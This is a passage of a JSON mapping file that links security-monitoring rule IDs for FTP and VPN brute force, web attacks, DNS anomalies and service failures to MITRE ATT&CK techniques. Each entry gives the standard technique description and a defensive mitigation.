            "Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes and to support other malicious activities, including distraction, hacktivism, and extortion.\n\nAn Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nBotnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.\n\nIn cases where traffic manipulation is used, there may be points in the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.\n\nFor attacks attempting to saturate the providing network, see [Network Denial of Service](\n"
        ],
        "mitigation_strategies": [
            "Leverage services provided by Content Delivery Networks (CDN) or providers specializing in DoS mitigations to filter traffic upstream from services. Filter boundary traffic by blocking source addresses sourcing the attack, blocking ports that are being targeted, or blocking protocols being used for transport. To defend against SYN floods, enable SYN Cookies."
        ]
    },
    {
        "rule_id": 11251,
        "rule_description": "ProFTPD: FTP brute force (multiple failed logins).",
        "mitre_id": [
            "T1110"
        ],
        "possible_attacks": [
            "Brute Force"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access."
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts."
        ]
    },
    {
        "rule_id": 11252,
        "rule_description": "ProFTPD: Multiple connection attempts from same source.",
        "mitre_id": [
            "T1110"
        ],
        "possible_attacks": [
            "Brute Force"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access."
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts."
        ]
    },
    {
        "rule_id": 11253,
        "rule_description": "ProFTPD: Multiple timed out logins from same source.",
        "mitre_id": [
            "T1110"
        ],
        "possible_attacks": [
            "Brute Force"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access."
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts."
        ]
    },
    {
        "rule_id": 11306,
        "rule_description": "pure-ftpd: FTP brute force (multiple failed logins).",
        "mitre_id": [
            "T1110"
        ],
        "possible_attacks": [
            "Brute Force"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access."
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts."
        ]
    },
    {
        "rule_id": 11307,
        "rule_description": "pure-ftpd: Multiple connection attempts from same source.",
        "mitre_id": [
            "T1110"
        ],
        "possible_attacks": [
            "Brute Force"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access."
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts."
        ]
    },
    {
        "rule_id": 11451,
        "rule_description": "vsftpd: FTP brute force (multiple failed logins).",
        "mitre_id": [
            "T1110"
        ],
        "possible_attacks": [
            "Brute Force"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access."
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts."
        ]
    },
    {
        "rule_id": 11452,
        "rule_description": "vsftpd: Multiple FTP connection attempts from",
        "mitre_id": [
            "T1110"
        ],
        "possible_attacks": [
            "Brute Force"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access."
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts."
        ]
    },
    {
        "rule_id": 11510,
        "rule_description": "MS-FTP: FTP brute force (multiple failed logins).",
        "mitre_id": [
            "T1110"
        ],
        "possible_attacks": [
            "Brute Force"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access."
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts."
        ]
    },
    {
        "rule_id": 11511,
        "rule_description": "MS-FTP: Multiple connection attempts from same source.",
        "mitre_id": [
            "T1110"
        ],
        "possible_attacks": [
            "Brute Force"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access."
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts."
        ]
    },
    {
        "rule_id": 11512,
        "rule_description": "MS-FTP: Multiple FTP errors from same source.",
        "mitre_id": [
            "T1021",
            "T1071.002"
        ],
        "possible_attacks": [
            "Remote Services",
            "File Transfer Protocols"
        ],
        "description": [
            "Adversaries may use [Valid Accounts]( to log into a service that accepts remote connections, such as telnet, SSH, and VNC. The adversary may then perform actions as the logged-on user.\n\nIn an enterprise environment, servers and workstations can be organized into domains. Domains provide centralized identity management, allowing users to login using one set of credentials across the entire network. If an adversary is able to obtain a set of valid domain credentials, they could login to many different machines using remote access protocols such as secure shell (SSH) or remote desktop protocol (RDP). They could also login to accessible SaaS or IaaS services, such as those that federate their identities to the domain. \n\nLegitimate applications (such as [Software Deployment Tools]( and other administrative programs) may utilize [Remote Services]( to access remote hosts. For example, Apple Remote Desktop (ARD) on macOS is native software used for remote management. ARD leverages a blend of protocols, including [VNC]( to send the screen and control buffers and [SSH]( for secure file transfer. Adversaries can abuse applications such as ARD to gain remote code execution and perform lateral movement. In versions of macOS prior to 10.14, an adversary can escalate an SSH session to an ARD session which enables an adversary to accept TCC (Transparency, Consent, and Control) prompts without user interaction and gain access to data.",
            "Adversaries may communicate using application layer protocols associated with transferring files to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as SMB, FTP, FTPS, and TFTP that transfer files may be very common in environments.  Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the transferred files. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. "
        ],
        "mitigation_strategies": [
            "Limit the accounts that may use remote services. Limit the permissions for accounts that are at higher risk of compromise; for example, configure SSH so users can only run specific programs.",
            "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. "
        ]
    },
    {
        "rule_id": 12101,
        "rule_description": "Invalid DNS packet. Possibility of attack.",
        "mitre_id": [
            "T1071",
            "T1499"
        ],
        "possible_attacks": [
            "Application Layer Protocol",
            "Endpoint Denial of Service"
        ],
        "description": [
            "Adversaries may communicate using OSI application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nAdversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, DNS, or publishing/subscribing. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP. ",
            "Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes and to support other malicious activities, including distraction, hacktivism, and extortion.\n\nAn Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nBotnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.\n\nIn cases where traffic manipulation is used, there may be points in the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.\n\nFor attacks attempting to saturate the providing network, see [Network Denial of Service](\n"
        ],
        "mitigation_strategies": [
            "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level.",
            "Leverage services provided by Content Delivery Networks (CDN) or providers specializing in DoS mitigations to filter traffic upstream from services. Filter boundary traffic by blocking source addresses sourcing the attack, blocking ports that are being targeted, or blocking protocols being used for transport. To defend against SYN floods, enable SYN Cookies."
        ]
    },
    {
        "rule_id": 14151,
        "rule_description": "racoon: Multiple failed VPN logins.",
        "mitre_id": [
            "T1110",
            "T1133"
        ],
        "possible_attacks": [
            "Brute Force",
            "External Remote Services"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access.",
            "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management]( and [VNC]( can also be used externally.\n\nAccess to [Valid Accounts]( to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network. Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard."
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts.",
            "Deny direct remote access to internal systems through the use of network proxies, gateways, and firewalls."
        ]
    },
    {
        "rule_id": 14251,
        "rule_description": "CiscoVPN: Multiple VPN authentication failures.",
        "mitre_id": [
            "T1110",
            "T1133"
        ],
        "possible_attacks": [
            "Brute Force",
            "External Remote Services"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access.",
            "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management]( and [VNC]( can also be used externally.\n\nAccess to [Valid Accounts]( to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network. Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard."
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts.",
            "Deny direct remote access to internal systems through the use of network proxies, gateways, and firewalls."
        ]
    },
    {
        "rule_id": 7710,
        "rule_description": "Microsoft Security Essentials - Service failed.",
        "mitre_id": [
            "T1489"
        ],
        "possible_attacks": [
            "Service Stop"
        ],
        "description": [
            "Adversaries may stop or disable services on a system to render those services unavailable to legitimate users. Stopping critical services or processes can inhibit or stop response to an incident or aid in the adversary's overall objectives to cause damage to the environment. \n\nAdversaries may accomplish this by disabling individual services of high importance to an organization, such as <code>MSExchangeIS</code>, which will make Exchange content inaccessible. In some cases, adversaries may stop or disable many or all services to render systems unusable. Services or processes may not allow for modification of their data stores while running. Adversaries may stop services or processes in order to conduct [Data Destruction]( or [Data Encrypted for Impact]( on the data stores of services like Exchange and SQL Server."
        ],
        "mitigation_strategies": [
            "Limit privileges of user accounts and groups so that only authorized administrators can interact with service changes and service configurations."
        ]
    },
    {
        "rule_id": 7711,
        "rule_description": "Microsoft Security Essentials - Real time protection failed.",
        "mitre_id": [
            "T1489"
        ],
        "possible_attacks": [
            "Service Stop"
        ],
        "description": [
            "Adversaries may stop or disable services on a system to render those services unavailable to legitimate users. Stopping critical services or processes can inhibit or stop response to an incident or aid in the adversary's overall objectives to cause damage to the environment. \n\nAdversaries may accomplish this by disabling individual services of high importance to an organization, such as <code>MSExchangeIS</code>, which will make Exchange content inaccessible. In some cases, adversaries may stop or disable many or all services to render systems unusable. Services or processes may not allow for modification of their data stores while running. Adversaries may stop services or processes in order to conduct [Data Destruction]( or [Data Encrypted for Impact]( on the data stores of services like Exchange and SQL Server."
        ],
        "mitigation_strategies": [
            "Limit privileges of user accounts and groups so that only authorized administrators can interact with service changes and service configurations."
        ]
    },
    {
        "rule_id": 7716,
        "rule_description": "Microsoft Security Essentials - Scan error. Scan has stopped.",
        "mitre_id": [
            "T1489"
        ],
        "possible_attacks": [
            "Service Stop"
        ],
        "description": [
            "Adversaries may stop or disable services on a system to render those services unavailable to legitimate users. Stopping critical services or processes can inhibit or stop response to an incident or aid in the adversary's overall objectives to cause damage to the environment. \n\nAdversaries may accomplish this by disabling individual services of high importance to an organization, such as <code>MSExchangeIS</code>, which will make Exchange content inaccessible. In some cases, adversaries may stop or disable many or all services to render systems unusable. Services or processes may not allow for modification of their data stores while running. Adversaries may stop services or processes in order to conduct [Data Destruction]( or [Data Encrypted for Impact]( on the data stores of services like Exchange and SQL Server."
        ],
        "mitigation_strategies": [
            "Limit privileges of user accounts and groups so that only authorized administrators can interact with service changes and service configurations."
        ]
    },
    {
        "rule_id": 19120,
        "rule_description": "Virtual machine state changed to OFF.",
        "mitre_id": [
            "T1529"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 19150,
        "rule_description": "Multiple VMWare ESX warning messages.",
        "mitre_id": [
            "T1497"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 19151,
        "rule_description": "Multiple VMWare ESX error messages.",
        "mitre_id": [
            "T1497"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 19152,
        "rule_description": "Multiple VMWare ESX authentication failures.",
        "mitre_id": [
            "T1110",
            "T1497"
        ],
        "possible_attacks": [
            "Brute Force"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access."
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts."
        ]
    },
    {
        "rule_id": 19153,
        "rule_description": "Multiple VMWare ESX user authentication failures.",
        "mitre_id": [
            "T1110",
            "T1497"
        ],
        "possible_attacks": [
            "Brute Force"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access."
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts."
        ]
    },
    {
        "rule_id": 31103,
        "rule_description": "SQL injection attempt.",
        "mitre_id": [
            "T1190"
        ],
        "possible_attacks": [
            "Exploit Public-Facing Application"
        ],
        "description": [
            "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet-accessible open sockets. Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion]( or [Exploitation for Client Execution](\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs (e.g., via the [Cloud Instance Metadata API]( exploit container host access via [Escape to Host]( or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities."
        ],
        "mitigation_strategies": [
            "Regularly scan externally facing systems for vulnerabilities and establish procedures to rapidly patch systems when critical vulnerabilities are discovered through scanning and through public disclosure."
        ]
    },
    {
        "rule_id": 31104,
        "rule_description": "Common web attack.",
        "mitre_id": [
            "T1055",
            "T1083",
            "T1190"
        ],
        "possible_attacks": [
            "Process Injection",
            "Exploit Public-Facing Application"
        ],
        "description": [
            "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \n\nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \n\nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. ",
            "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet-accessible open sockets. Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion]( or [Exploitation for Client Execution](\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs (e.g., via the [Cloud Instance Metadata API]( exploit container host access via [Escape to Host]( or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities."
        ],
        "mitigation_strategies": [
            "Utilize Yama (ex: /proc/sys/kernel/yama/ptrace_scope) to mitigate ptrace based process injection by restricting the use of ptrace to privileged users only. Other mitigation controls involve the deployment of security kernel modules that provide advanced access control and process restrictions such as SELinux, grsecurity, and AppArmor.",
            "Regularly scan externally facing systems for vulnerabilities and establish procedures to rapidly patch systems when critical vulnerabilities are discovered through scanning and through public disclosure."
        ]
    },
    {
        "rule_id": 31105,
        "rule_description": "XSS (Cross Site Scripting) attempt.",
        "mitre_id": [
            "T1059.007"
        ],
        "possible_attacks": [
            "JavaScript"
        ],
        "description": [
            "Adversaries may abuse various implementations of JavaScript for execution. JavaScript (JS) is a platform-independent scripting language (compiled just-in-time at runtime) commonly associated with scripts in webpages, though JS can be executed in runtime environments outside the browser.\n\nJScript is the Microsoft implementation of the same scripting standard. JScript is interpreted via the Windows Script engine and thus integrated with many components of Windows such as the [Component Object Model]( and Internet Explorer HTML Application (HTA) pages.\n\nJavaScript for Automation (JXA) is a macOS scripting language based on JavaScript, included as part of Apple\u2019s Open Scripting Architecture (OSA), that was introduced in OSX 10.10. Apple\u2019s OSA provides scripting capabilities to control applications, interface with the operating system, and bridge access into the rest of Apple\u2019s internal APIs. As of OSX 10.10, OSA only supports two languages, JXA and [AppleScript]( Scripts can be executed via the command line utility <code>osascript</code>, they can be compiled into applications or script files via <code>osacompile</code>, and they can be compiled and executed in memory of other programs by leveraging the OSAKit Framework.\n\nAdversaries may abuse various implementations of JavaScript to execute various behaviors. Common uses include hosting malicious scripts on websites as part of a [Drive-by Compromise]( or downloading and executing these script files as secondary payloads. Since these payloads are text-based, it is also very common for adversaries to obfuscate their content as part of [Obfuscated Files or Information]("
        ],
        "mitigation_strategies": [
            "Script blocking extensions can help prevent the execution of JavaScript and HTA files that may commonly be used during the exploitation process. For malicious code served up through ads, adblockers can help prevent that code from executing in the first place."
        ]
    },
    {
        "rule_id": 31106,
        "rule_description": "A web attack returned code 200 (success).",
        "mitre_id": [
            "T1190"
        ],
        "possible_attacks": [
            "Exploit Public-Facing Application"
        ],
        "description": [
            "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet-accessible open sockets. Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion]( or [Exploitation for Client Execution](\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs (e.g., via the [Cloud Instance Metadata API]( exploit container host access via [Escape to Host]( or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities."
        ],
        "mitigation_strategies": [
            "Regularly scan externally facing systems for vulnerabilities and establish procedures to rapidly patch systems when critical vulnerabilities are discovered through scanning and through public disclosure."
        ]
    },
    {
        "rule_id": 31110,
        "rule_description": "PHP CGI-bin vulnerability attempt.",
        "mitre_id": [
            "T1210"
        ],
        "possible_attacks": [
            "Exploitation of Remote Services"
        ],
        "description": [
